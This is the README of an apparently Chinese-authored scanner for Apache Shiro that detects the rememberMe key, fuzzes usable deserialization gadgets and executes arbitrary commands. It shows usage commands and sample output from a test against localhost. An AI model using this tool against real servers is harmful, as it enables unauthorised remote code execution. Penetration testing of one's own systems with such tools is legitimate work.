# DearShiro

## Start

**一个不万能的Shiro扫描工具**

人类低质量代码，就当练个手。

目前已完成:
- Key的探测
- 可用Gadget的探测
- 利用Gadget执行命令


后续todo:
- 图形化？
- 修复某些未知BUG

工具内置Gadget:
- CommonsBeanUtilsNoCC
- CommonsCollectionsK1
- CommonsCollectionsK2
- CommonsCollectionsK3
- CommonsCollectionsK4

## Usage

```python
❯ java -jar dearshiro.jar --help

Usage: <main class> [options]
  Options:
  * -m, --module
      module
  * -b, --baseurl
      baseurl
    -k, --key
      key
      Default: kPH+bIxk5D2deZiIxcaaaA==
    -g, --gadget
      gadget
      Default: NoCC
    -c, --command
      command
      Default: open -a Calculator
    --help


java -jar dearshiro.jar -m {module} -b {baseurl} [-k] [-g] [-c]
# key module 扫描key
java -jar dearshiro.jar -m "key" -b {baseurl}
# dadgetfuzz module 扫描可用gadget
java -jar dearshrio.jar -m "gadgetfuzz" -b {baseurl} -k {key}
# gadgetexec module 使用gadget执行任意命令
java -jar dearshiro.jar -m "gadgetexec" -b {baseurl} -k {key} -g {gadget} -c {command}
```

初步测试：

```
❯ java -jar dearshiro.jar -m "key" -b "http://127.0.0.1:8000/login.jsp"                                                                              
[+] Test key: 0AvVhmFLUs0KTA3Kprsdag==
[-] Response Code: 200
[+] Test key: kPH+bIxk5D2deZiIxcaaaA==
[-] Response Code: 200
[*] Found Key: kPH+bIxk5D2deZiIxcaaaA==


❯ java -jar dearshiro.jar -m "gadgetfuzz" -b "http://127.0.0.1:8000/login.jsp" -k "kPH+bIxk5D2deZiIxcaaaA=="    
[main] INFO org.reflections.Reflections - Reflections took 18 ms to scan 1 urls, producing 1 keys and 5 values 
[+] Test Gadget: CCK2
[-] Response Code: 200
[+] Test Gadget: NoCC
[-] Response Code: 200
[*] Found Gadget: NoCC
[+] Test Gadget: JRMPClient
[-] Response Code: 200
[+] Test Gadget: CCK1
[-] Response Code: 200
[*] Found Gadget: CCK1
########Available Gadget##########
NoCC
CCK1
########Available Gadget##########

```

